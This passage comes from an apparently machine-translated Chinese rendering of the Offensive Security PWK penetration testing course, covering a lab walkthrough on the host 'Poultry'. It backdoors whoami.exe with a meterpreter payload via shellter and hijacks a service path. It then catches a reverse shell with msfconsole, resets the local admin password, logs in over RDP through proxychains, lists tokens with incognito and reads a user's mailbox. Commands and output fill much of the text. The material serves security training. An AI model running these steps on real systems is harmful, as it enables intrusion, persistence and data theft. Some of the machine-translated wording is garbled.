<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:3517;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">注射：验证！</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:3551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">按 [Enter] 继续...</font></font></nobr></div>
<div style="position:absolute;top:3570;left:269"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 974 - 将 meterpreter shell 注入 whoami 二进制文件 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:3739;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="4"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 4 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:3772;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:4849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:4849;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:4849;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">813</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:3868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当提示“选择有效负载”时，我们提供生成的有效负载的完整路径。</font><font style="vertical-align: inherit;">最后，</font></font></nobr></div>
<div style="position:absolute;top:3887;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shellter 会询问这个有效载荷是否是一个反射 DLL 加载器，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">742</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，在这种情况下，它不是。</font></font></nobr></div>
<div style="position:absolute;top:3906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后有效载荷将被注入到二进制文件中，shellter 将为我们提供“注入：</font></font></nobr></div>
<div style="position:absolute;top:3926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">验证了！” </font><font style="vertical-align: inherit;">信息。</font></font></nobr></div>
<div style="position:absolute;top:3959;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在目标PE已成功后门，我们可以传输whoami.exe二进制文件</font></font></nobr></div>
<div style="position:absolute;top:3978;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Poultry 并将其放置在正确的位置。</font><font style="vertical-align: inherit;">为了传输二进制文件，我们将再次使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http.server</font></font></i></nobr></div>
<div style="position:absolute;top:3997;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">python中的模块。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo python3 -m http.server 80</font></font></font></b></nobr></div>
<div style="position:absolute;top:4049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 0.0.0.0 端口 80 (http://0.0.0.0:80/) 上提供 HTTP ...</font></font></nobr></div>
<div style="position:absolute;top:4068;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 975 - 通过 python 启动 HTTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当 http 服务器启动时，我们可以通过在 Internet Explorer 中打开我们的 Kali IP 来导航到它。</font><font style="vertical-align: inherit;">如果</font></font></nobr></div>
<div style="position:absolute;top:4117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成功后，我们将看到 whoami 二进制文件和 met.bin 负载。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4662;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 347：导航到 HTTP 服务器</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击 whoami.exe 链接将显示下载提示，我们可以在其中选择“保存”。</font><font style="vertical-align: inherit;">一次</font></font></nobr></div>
<div style="position:absolute;top:4712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存后，我们可以在用户的​​下载目录中找到二进制文件。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:4799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">742 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（斯蒂芬较少，2013），https://github.com/stephenfewer/ReflectiveDLLInjection</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:4927;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="5"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 5 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:4960;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:6037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:6037;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:6037;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">814</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5310;left:335"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 348：查看下载的二进制文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载完成后，我们将二进制文件重命名为 Current.exe 并将其复制到 C:\Puppet。</font></font></nobr></div>
<div style="position:absolute;top:5361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这将确保在 Windows 尝试执行真正的二进制文件之前执行二进制文件</font></font></nobr></div>
<div style="position:absolute;top:5380;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在服务启动时。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5938;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 349：将 whoami.exe 复制到 Puppet</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5969;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">接下来，我们需要</font><font style="vertical-align: inherit;">使用我们之前用来生成文件的配置</font><font style="vertical-align: inherit;">来启动</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfconsole</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:5988;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷以捕获我们的反向shell。</font><font style="vertical-align: inherit;">我们还将指示 Metasploit 将 shell 迁移到</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:6115;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="6"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 6 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:6148;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:7225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:7225;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:7225;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">815</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6244;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个进程并确保外壳保持连接，即使 Windows 认为该服务已</font></font></nobr></div>
<div style="position:absolute;top:6263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未能启动。</font><font style="vertical-align: inherit;">为此，我们将设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoRunScript</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以在</font></font></nobr></div>
<div style="position:absolute;top:6282;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 会话开始。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfconsole -q -x "使用exploit/multi/handler;\</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:6334;left:319"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 PAYLOAD windows/meterpreter/reverse_tcp;\</font></font></b></nobr></div>
<div style="position:absolute;top:6351;left:319"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;span custom-style="BoldCodeRed"&gt;设置 AutoRunScript post/wind</font></font></b></nobr></div>
<div style="position:absolute;top:6368;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流/管理/迁移；\</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6385;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4;\</font></font></nobr></div>
<div style="position:absolute;top:6402;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 80;\</font></font></nobr></div>
<div style="position:absolute;top:6419;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行”&lt;/span&gt;</font></font></nobr></div>
<div style="position:absolute;top:6436;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:6453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:80 启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:6472;left:364"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 976 - 启动 msfconsole</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6502;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一切就绪后，我们将尝试重新启动 Poultry 框并等待我们的反向 shell。</font><font style="vertical-align: inherit;">在</font></font></nobr></div>
<div style="position:absolute;top:6521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了有一个持久的后门，我们可以运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">net user</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来重置家禽管理员的密码</font></font></nobr></div>
<div style="position:absolute;top:6540;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（我们之前确定的本地管理员用户）。</font><font style="vertical-align: inherit;">由于我们将返回的外壳正在运行</font></font></nobr></div>
<div style="position:absolute;top:6560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SYSTEM</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限，我们应该不会在重置密码时遇到问题。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6595;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 10.11.0.4:80 启动反向 TCP 处理程序 </font></font></nobr></div>
<div style="position:absolute;top:6612;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 发送阶段（180291 字节）到 10.11.1.250</font></font></nobr></div>
<div style="position:absolute;top:6629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] Meterpreter session 2 在 2020-01-01 15:5 开启 (10.11.0.4:80 -&gt; 10.11.1.250:9447)</font></font></nobr></div>
<div style="position:absolute;top:6646;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">6:03 -0700</font></font></nobr></div>
<div style="position:absolute;top:6663;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 会话 ID 1 (10.11.0.4:80 -&gt; 10.11.1.250:9447) 处理 AutoRunScript 'post/win</font></font></nobr></div>
<div style="position:absolute;top:6679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">道琼斯指数/管理/迁移'</font></font></nobr></div>
<div style="position:absolute;top:6696;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 针对 POULTRY 运行模块</font></font></nobr></div>
<div style="position:absolute;top:6714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 当前服务器进程：Current.exe (1560)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:6731;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 生成要迁移到的 notepad.exe 进程</font></font></b></nobr></div>
<div style="position:absolute;top:6748;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 迁移到 2324</font></font></b></nobr></div>
<div style="position:absolute;top:6764;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 成功迁移到进程2324</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳</font></font></font></b></nobr></div>
<div style="position:absolute;top:6815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进程 2784 已创建。</font></font></nobr></div>
<div style="position:absolute;top:6832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">频道 1 已创建。</font></font></nobr></div>
<div style="position:absolute;top:6849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows [版本 6.1.7601]</font></font></nobr></div>
<div style="position:absolute;top:6866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 (c) 2009 Microsoft Corporation。</font><font style="vertical-align: inherit;">版权所有。</font></font></nobr></div>
<div style="position:absolute;top:6900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">whoami</font></font></font></b></nobr></div>
<div style="position:absolute;top:6917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我是谁</font></font></nobr></div>
<div style="position:absolute;top:6934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nt权限\系统</font></font></nobr></div>
<div style="position:absolute;top:6968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络用户家禽管理员 OffSecHax1！</font></font></font></b></nobr></div>
<div style="position:absolute;top:6985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">净用户家禽管理员 OffSecHax1！</font></font></nobr></div>
<div style="position:absolute;top:7002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令成功完成。</font></font></nobr></div>
<div style="position:absolute;top:7036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Windows\system32&gt;</font></font></nobr></div>
<div style="position:absolute;top:7055;left:364"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 977 - 获取系统 shell</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7085;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改密码后，我们可以尝试通过远程桌面登录。</font><font style="vertical-align: inherit;">这一次，我们不</font></font></nobr></div>
<div style="position:absolute;top:7104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/d</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标志，因为我们以本地管理员用户身份登录。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:7139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proxychains xfreerdp /u:poultryadmin /v:10.5.5.20 +clipboard</font></font></font></b></nobr></div>
<div style="position:absolute;top:7156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ProxyChains-3.1 (http://proxychains.sf.net)</font></font></nobr></div>
<div style="position:absolute;top:7173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[16:16:47:626] [INFO][com.freerdp.client.common.cmdline] - 加载 channelEx cliprdr </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:7303;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="7"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 7 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:7336;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:8413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:8413;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:8413;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">816</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:7432;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|S链|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.5.5.20:3389-&lt;&gt;&lt;&gt;-OK</font></font></nobr></div>
<div style="position:absolute;top:7448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">密码： </font></font></nobr></div>
<div style="position:absolute;top:7468;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 978 - 作为家禽管理员的 xFreeRDP</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在对工作站进行身份验证后，我们会看到家禽管理员用户的桌面。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8077;left:351"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 350：Poultryadmin RDP 访问</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过对 Poultry 的管理员访问权限，我们可以开始寻找对域控制器的访问权限。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:8143;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.6.5</font></font></i></nobr></div>
<div style="position:absolute;top:8143;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">开发后枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过访问 admin 用户，我们要尝试的第一个枚举是尝试列出</font></font></nobr></div>
<div style="position:absolute;top:8200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何登录用户的域令牌。</font><font style="vertical-align: inherit;">我们不希望找到太多，因为我们刚刚重新启动</font></font></nobr></div>
<div style="position:absolute;top:8219;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows，但无论如何检查是个好主意。</font></font></nobr></div>
<div style="position:absolute;top:8252;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了列出令牌，我们将使用 meterpreter 的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">隐身</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扩展。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第743章</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回到Meterpreter</font></font></nobr></div>
<div style="position:absolute;top:8272;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">shell，我们可以加载</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">隐身</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扩展并按用户名（</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">）</font><font style="vertical-align: inherit;">列出令牌</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:8363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">743 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2020），https://www.offensive-security.com/metasploit-unleashed/fun-incognito/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:8491;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="8"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 8 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:8524;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:9601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:9601;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:9601;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">817</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:8622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用隐身模式</font></font></font></b></nobr></div>
<div style="position:absolute;top:8639;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">加载扩展隐身...成功。</font></font></nobr></div>
<div style="position:absolute;top:8673;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt; </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">list_tokens -u</font></font></font></b></nobr></div>
<div style="position:absolute;top:8707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用的委托代币</font></font></nobr></div>
<div style="position:absolute;top:8724;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========================================</font></font></nobr></div>
<div style="position:absolute;top:8740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT当局\当地服务</font></font></nobr></div>
<div style="position:absolute;top:8757;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权威\网络服务</font></font></nobr></div>
<div style="position:absolute;top:8775;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT权限\系统</font></font></nobr></div>
<div style="position:absolute;top:8792;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家禽\家禽管理员</font></font></nobr></div>
<div style="position:absolute;top:8825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用的模拟令牌</font></font></nobr></div>
<div style="position:absolute;top:8842;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========================================</font></font></nobr></div>
<div style="position:absolute;top:8859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NT 权威\匿名登录</font></font></nobr></div>
<div style="position:absolute;top:8893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:8913;left:331"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 979 - 使用隐身转储令牌</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:8942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不幸的是，这并没有为我们提供我们还没有的任何访问权限。</font></font></nobr></div>
<div style="position:absolute;top:8975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以继续环顾四周。</font><font style="vertical-align: inherit;">我们看到Thunderbird也安装了，但是没有设置</font></font></nobr></div>
<div style="position:absolute;top:8994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为管理员用户。</font><font style="vertical-align: inherit;">我们可以通过导航到查看亚历克斯的邮箱</font></font></nobr></div>
<div style="position:absolute;top:9014;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">C:\Users\alex\AppData\Roaming\Thunderbird\Profiles\jbv4ndsh.default-</font></font></nobr></div>
<div style="position:absolute;top:9033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">release\Mail\mail.sandbox.local\Inbox。</font><font style="vertical-align: inherit;">电子邮件的内容只是向亚历克斯抱怨</font></font></nobr></div>
<div style="position:absolute;top:9052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关于正在使用的旧 Windows 版本。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:9087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 - 2019 年 11 月 13 日星期三 17:05:33</font></font></nobr></div>
<div style="position:absolute;top:9104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">X-Account-Key: account1</font></font></nobr></div>
<div style="position:absolute;top:9121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:9138;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">回复：admin@sandbox.local</font></font></nobr></div>
